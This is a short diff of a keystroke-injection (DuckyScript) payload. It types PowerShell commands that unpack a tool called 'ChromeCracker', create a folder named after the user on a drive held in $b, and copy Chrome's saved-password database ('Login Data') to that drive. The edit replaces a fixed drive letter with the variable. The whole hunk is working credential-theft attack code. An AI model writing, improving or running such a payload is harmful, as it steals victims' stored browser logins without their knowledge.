@@ -40,7 +40,7 @@ DELAY 800
 STRING Expand-Archive C:\Users\$env:UserName\ChromeCracker.zip -DestinationPath C:\Users\$env:UserName\ChromeCracker -Force
 ENTER
 DELAY 800
-STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "x:\" -Force
+STRING New-Item -ItemType "directory" -Name "$env:UserName" -Path "$b\" -Force
 ENTER
 DELAY 800
 STRING Copy-Item -Path "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data" -Destination "$b\$env:UserName\"
